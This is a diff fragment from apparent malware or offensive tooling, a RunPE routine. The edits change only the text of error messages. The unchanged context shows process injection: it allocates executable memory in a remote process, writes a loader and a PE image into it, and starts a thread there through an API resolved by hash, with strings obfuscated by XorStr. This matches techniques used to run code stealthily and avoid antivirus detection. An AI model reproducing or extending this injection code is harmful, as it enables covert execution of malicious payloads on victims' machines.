@@ -335,21 +335,21 @@ int RunPE(BYTE* image, wchar_t* path, DWORD imageSize, wchar_t* args = (wchar_t*
 	}
 	else
 	{
-		printfdbg(XorStr("Cannot open handle %x\n"), GetLastError());
+		printfdbg(XorStr("Cannot open handle %s\n"), GetLastErrorAsText());
 		return 1;
 	}
 
 	// get remote process arch
 	const int bits = GetProcessBits(hProc);
 	if (bits == 0) {
-		printfdbg(XorStr("GetProcessBits error %x\n"), GetLastError());
+		printfdbg(XorStr("GetProcessBits error %s\n"), GetLastErrorAsText());
 		return 1;
 	}
 
 	// ensure inject process is same arch as dll 
 	const IMAGE_NT_HEADERS* ntHeader = GetNtHeader(image, imageSize);
 	if (ntHeader == NULL) {
-		printfdbg(XorStr("GetNtHeader error %x\n"), GetLastError());
+		printfdbg(XorStr("GetNtHeader error %s\n"), GetLastErrorAsText());
 		return 1;
 	}
   
@@ -377,7 +377,7 @@ int RunPE(BYTE* image, wchar_t* path, DWORD imageSize, wchar_t* args = (wchar_t*
 	const size_t remoteShellcodeSize = loaderSize + imageSize;
 	void* remoteShellcode = pVirtualAllocEx(hProc, 0, remoteShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (remoteShellcode == NULL) {
-		printfdbg(XorStr("pVirtualAllocEx error %x\n"), GetLastError());	
+		printfdbg(XorStr("pVirtualAllocEx error %s\n"), GetLastErrorAsText());	
 		return 1;
 	} 
 
@@ -385,7 +385,7 @@ int RunPE(BYTE* image, wchar_t* path, DWORD imageSize, wchar_t* args = (wchar_t*
 	SIZE_T numWritten = 0;
 	if (!pWriteProcessMemory(hProc, remoteShellcode, loader, loaderSize, &numWritten) ||
 		!pWriteProcessMemory(hProc, (BYTE*)remoteShellcode + loaderSize, image, imageSize, &numWritten)) {
-		printfdbg(XorStr("pWriteProcessMemory error %x\n"), GetLastError());
+		printfdbg(XorStr("pWriteProcessMemory error %s\n"), GetLastErrorAsText());
 		return 1;
 	}
  
@@ -393,7 +393,7 @@ int RunPE(BYTE* image, wchar_t* path, DWORD imageSize, wchar_t* args = (wchar_t*
 	if ((GetCurrentProcessBits() == 64) || (GetCurrentProcessBits() == bits)) {
 		RTLCREATEUSERTHREAD fpRtlCreateUserThread = (RTLCREATEUSERTHREAD)get_proc_address(hNtdll, 0xd24c9118);
 		if (fpRtlCreateUserThread == NULL) {
-			printfdbg(XorStr("fpRtlCreateUserThread error %x\n"), GetLastError());
+			printfdbg(XorStr("fpRtlCreateUserThread error %s\n"), GetLastErrorAsText());
 			return 1;
 		}
 		fpRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)remoteShellcode, NULL, &hThread, NULL);
